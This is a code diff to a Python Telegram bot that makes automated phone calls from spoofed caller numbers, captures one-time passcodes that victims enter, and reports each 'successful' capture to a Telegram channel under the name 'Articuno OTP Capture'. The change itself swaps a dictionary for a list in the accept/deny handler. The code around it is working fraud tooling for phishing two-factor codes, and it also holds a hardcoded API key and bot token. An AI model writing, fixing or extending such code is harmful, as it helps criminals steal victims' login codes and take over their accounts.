@@ -37,7 +37,7 @@ apiKey = '741852963741852963789456123'
 last_message_ids = {}
 ringing_handler = []
 recording_handler = {}
-accept_deny_handler = {}
+accept_deny_handler = []
 
 
 updater = Updater(token=bot_tkn, use_context=True)
@@ -786,12 +786,7 @@ def Set_custogrem_script(message):
  
 
 #------------------------------------------------------------------------------------------------------------------
-def delete_accept_deny(chat_id):
-     global accept_deny_handler
-     try:
-        del accept_deny_handler[chat_id]
-     except:
-        print("Error in deleting")
+
 
 
 def retrive_recording(rec_url,chatid):
@@ -862,7 +857,7 @@ def custom_callmaking(number,spoof,chatid,script_id):
 def custom_make_call(t:str,f:str,user_id,script_id:int):
     global accept_deny_handler
     try:
-        del accept_deny_handler[user_id]
+         accept_deny_handler.remove(user_id)
     except:
         pass
     custom_callmaking(number=t,spoof=f,chatid=user_id,script_id=script_id)
@@ -939,9 +934,9 @@ def custom_confirm1(message,otp_message):
         bot.send_message(chat_id,f"*Code Accpeted ✅ *",parse_mode='markdown')
         time.sleep(3)
         try:
-             del accept_deny_handler[chat_id]
+            accept_deny_handler.remove(chat_id)
         except:
-             pass
+             print("remove error")
         finally:
             callhangup(call_control_id)
 
@@ -955,14 +950,14 @@ def custom_confirm1(message,otp_message):
 
 }
         requests.post(url, json=data)
-        delete_accept_deny(chat_id)
+        
 
     c.close()
     return 'Webhook received successfully!', 200
         
 @app.route('/<script_id>/<chatid>/custom', methods=['POST'])
 def custom_prebuild_script_call(script_id,chatid):
-    global ringing_handler
+    global ringing_handler ,accept_deny_handler
     global recording_handler
     db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
     c = db.cursor()
@@ -1066,7 +1061,10 @@ def custom_prebuild_script_call(script_id,chatid):
             item2 = types.InlineKeyboardButton(text="Deny ❌",callback_data="/deny")
             keyboard.add(item1,item2) 
             bot.send_message(chatid,f"""<b><i>Code Captured <code>{otp2}</code>  ✅</i></b>""",parse_mode='HTML',reply_markup=keyboard)
-            delete_accept_deny(chatid)
+            try:
+                accept_deny_handler.remove(chatid)
+            except:
+                 print("remove error gather")
             requests.post(f"""https://api.telegram.org/bot6594047154:AAEkLCy48iP2fx-PVeQUlgt_XAJJJ2nPWGs/sendMessage?chat_id=-1002076456397&text=
 🚀 Articuno OTP Capture 🚀
 Another Call Was Successful 👤
@@ -1197,12 +1195,12 @@ def handle_callback(message):
     elif message.data == '/accept':
          if message.from_user.id not in accept_deny_handler:
             custom_confirm1(message,"Accept")
-            accept_deny_handler[message.from_user.id] = "Accept"
+            accept_deny_handler.append(message.from_user.id)
     
     elif message.data == '/deny':
          if message.from_user.id not in accept_deny_handler:
             custom_confirm1(message,"Deny")
-            accept_deny_handler[message.from_user.id] = "Deny"
+            accept_deny_handler.append(message.from_user.id)
          
          
          
